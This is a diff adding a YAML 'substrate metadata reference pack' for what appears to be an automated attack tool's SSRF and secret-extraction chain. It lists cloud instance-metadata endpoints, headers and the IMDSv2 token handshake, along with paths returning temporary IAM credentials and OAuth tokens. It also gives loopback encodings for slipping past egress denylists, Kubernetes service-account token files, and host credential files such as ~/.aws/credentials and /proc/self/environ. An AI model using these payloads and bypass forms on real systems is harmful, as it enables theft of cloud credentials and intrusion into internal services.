@@ -1,0 +1,128 @@
+# Substrate metadata reference pack (design/ARCHITECTURE.md §15, decisions D1/D3/D11).
+#
+# "Substrate knowledge is DATA, not code": the per-cloud / per-orchestrator metadata
+# endpoints, required headers, and credential paths that the infrastructure & secret-
+# extraction chain (§15) points its SSRF/EXTRACT step at. A new cloud, an IP change, or a
+# new IMDS version lands as an edit HERE — never in engine code. The pack is versioned and
+# `as_of`-stamped so the start-of-loop intel refresh (§5) can keep it current and a run can
+# record which edition it probed with.
+#
+# Each entry shape:
+#   id              stable key
+#   family          cloud | orchestrator | host
+#   endpoints       link-local / well-known metadata hosts (IPv4 + IPv6 where applicable)
+#   header          required request header (or null) for the metadata service
+#   handshake       optional pre-step (e.g. AWS IMDSv2 PUT-token dance) before reads
+#   credential_paths the high-value paths that return replayable IAM creds / tokens
+#   fingerprint_hints recon/header/stack substrings that suggest this substrate is in play
+
+version: 1
+as_of: "2026-06-21"
+source: "vendor instance-metadata docs (AWS/GCP/Azure/OCI) + community SSRF/metadata indexes"
+
+substrates:
+  - id: aws
+    family: cloud
+    endpoints: ["169.254.169.254", "[fd00:ec2::254]"]
+    header: null                       # IMDSv1: no header
+    handshake:                         # IMDSv2: token dance, then send the token header
+      method: PUT
+      url: "http://169.254.169.254/latest/api/token"
+      request_header: "X-aws-ec2-metadata-token-ttl-seconds: 21600"
+      response_token_header: "X-aws-ec2-metadata-token"
+    credential_paths:
+      - "/latest/meta-data/iam/security-credentials/"   # append <role> -> temp STS creds
+      - "/latest/dynamic/instance-identity/document"
+    fingerprint_hints: ["amazon", "aws", "ec2", "x-amz", "awselb", "s3"]
+
+  - id: gcp
+    family: cloud
+    endpoints: ["metadata.google.internal", "169.254.169.254"]
+    header: "Metadata-Flavor: Google"
+    credential_paths:
+      - "/computeMetadata/v1/instance/service-accounts/default/token"
+      - "/computeMetadata/v1/project/project-id"
+    fingerprint_hints: ["gcp", "google cloud", "gws", "gvisor", "appengine", "gke"]
+
+  - id: azure
+    family: cloud
+    endpoints: ["169.254.169.254"]
+    header: "Metadata: true"
+    credential_paths:
+      - "/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
+      - "/metadata/instance?api-version=2021-02-01"
+    fingerprint_hints: ["azure", "x-ms-", "windows-azure", "aks"]
+
+  - id: oci
+    family: cloud
+    endpoints: ["169.254.169.254"]
+    header: "Authorization: Bearer Oracle"
+    credential_paths:
+      - "/opc/v2/instance/"
+      - "/opc/v2/identity/cert.pem"
+    fingerprint_hints: ["oracle cloud", "oci", "x-oracle"]
+
+  - id: alibaba
+    family: cloud
+    endpoints: ["100.100.100.200"]
+    header: null
+    credential_paths:
+      - "/latest/meta-data/ram/security-credentials/"
+    fingerprint_hints: ["alibaba", "aliyun", "x-oss"]
+
+  - id: digitalocean
+    family: cloud
+    endpoints: ["169.254.169.254"]
+    header: null
+    credential_paths:
+      - "/metadata/v1/"
+      - "/metadata/v1/user-data"
+    fingerprint_hints: ["digitalocean", "do-", "droplet"]
+
+  - id: loopback
+    family: host
+    # The internal app itself, reachable from an outbound-fetch feature when the egress denylist is
+    # bypassable. The egress filter that blocks the IPv4/decimal/hex forms of 127.0.0.1 frequently
+    # MISSES the IPv6 loopback literal [::1] — which reaches the local Spring backend directly.
+    endpoints: ["127.0.0.1", "localhost", "[::1]", "[0:0:0:0:0:0:0:1]", "0.0.0.0", "127.0.0.1.nip.io"]
+    header: null
+    credential_paths: []
+    bypass_forms:                       # walk ALL — a single one slipping past the denylist = reach
+      - "[::1]"                          # IPv6 loopback — slips past IPv4-only denylists (decisive)
+      - "[::ffff:127.0.0.1]"             # IPv4-mapped IPv6
+      - "2130706433"                     # decimal of 127.0.0.1
+      - "0x7f000001"                     # hex
+      - "0177.0.0.1"                     # octal
+      - "127.1"                          # short form
+      - "0"                              # 0 -> 0.0.0.0 -> localhost on many stacks
+      - "127.0.0.1.nip.io"               # public DNS that resolves to loopback
+    internal_ports: { http: 8080, redis: 6379, metrics: 9090, debug: 5005 }
+    internal_paths:                      # high-signal internal-only paths once a reach lands
+      - "/actuator/env"
+      - "/actuator/health"
+      - "/api-docs"
+      - "/api/admin"
+    fingerprint_hints: []               # always worth walking when an outbound-fetch feature exists
+
+  - id: kubernetes
+    family: orchestrator
+    endpoints: ["kubernetes.default.svc"]   # in-pod API server (needs the SA token below)
+    header: null
+    credential_paths: []                # no anonymous HTTP cred path; secrets are files / internal svcs
+    file_paths:                         # reached via file-read / code-exec, not SSRF
+      - "/var/run/secrets/kubernetes.io/serviceaccount/token"
+      - "/var/run/secrets/kubernetes.io/serviceaccount/namespace"
+    internal_ports: { kubelet: 10250, etcd: 2379, api: 6443 }   # SSRF-to-internal (topology, §15)
+    fingerprint_hints: ["kubernetes", "k8s", "kube-", "ingress-nginx", "KUBERNETES_SERVICE_HOST"]
+
+  - id: host
+    family: host
+    endpoints: []                       # no metadata service; host/process secrets
+    header: null
+    credential_paths: []
+    file_paths:                         # the §15 "orchestrator/host secrets" set
+      - "/proc/self/environ"
+      - "~/.aws/credentials"
+      - "~/.config/gcloud/application_default_credentials.json"
+      - "~/.kube/config"
+    fingerprint_hints: []               # always worth trying once file-read/code-exec is achieved
